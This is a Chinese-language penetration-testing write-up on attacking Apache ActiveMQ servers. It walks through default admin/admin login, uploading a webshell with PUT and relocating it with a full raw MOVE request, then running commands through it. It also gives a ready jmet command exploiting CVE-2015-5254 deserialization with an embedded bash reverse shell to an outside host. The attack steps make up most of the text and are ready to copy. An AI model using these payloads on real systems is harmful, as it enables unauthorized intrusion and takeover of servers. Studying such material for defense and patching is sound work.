介绍：对 ActiveMQ 中间件的漏洞利用方式总结。

0x00 前言

前阵子做某系统内网测试，发现其中一台服务器使用了 ActiveMQ 中间件，第一时间想到如果版本相符的话便可以 getshell ，但是因为平时碰到的机会很少，利用方法有些生疏了，耽误了点时间，这里做一个简单的复现巩固一下。

0x01 任意文件上传漏洞利用

1.1 ActiveMQ简介

Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持 Java 消息服务、集群、Spring Framework 等。

1.2 未授权文件上传

访问 http://example:8161/admin ，默认密码 admin ，登录后显示如下界面。

访问 http://example:8161/admin/test/systemProperties.jsp ，可获取到该服务的根目录。

抓取数据包，修改提交方法为 PUT ，目录修改为 fileserver ,提交一个 webshell ，系统返回 204 为提交成功。

1.3 移动文件获取shell

fileserver 目录没有执行文件权限，需要移动文件至其他目录，利用 MOVE 方法提交如下数据包，将 webshell 移动至 admin 目录下。

MOVE /fileserver/test.jsp HTTP/1.1Destination: file:///opt/activemq/webapps/admin/shell.jspHost: 192.168.31.14:8161User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateAuthorization: Basic YWRtaW46YWRtaW4=Connection: closeReferer: http://192.168.31.14:8161/admin/Cookie: JSESSIONID=1qaeqwykjf7up1uiy5y6reh9lnIf-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMTCache-Control: max-age=0Content-Length: 0

访问：
 http://example:8161/admin/shell.jsp?pwd=123&i=whoami 

获取服务器 shell 。

0x02 ActiveMQ反序列化漏洞利用

2.1 CVE-2015-5254

Apache ActiveMQ 5.13.0之前版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java 消息服务（JMS）ObjectMessage 对象利用该漏洞执行任意代码。

2.2 配置环境

下载jmet[1]的 jar 包，并在当前目录创建 external 文件夹。

cd /opt
wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
mkdir external

下载完成后执行反弹 shell 命令（需 bash 编码）：

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/192.168.31.15/1234 0>&1" -Yp ROME 192.168.31.14 61616

此时会在 ActiveMQ 的消息队列中增加一条队列。

如果该系统为未授权，我们可以自行点击触发，或等待管理员点击，点击后即可执行反弹 shell 命令。

  至此获取服务器权限。
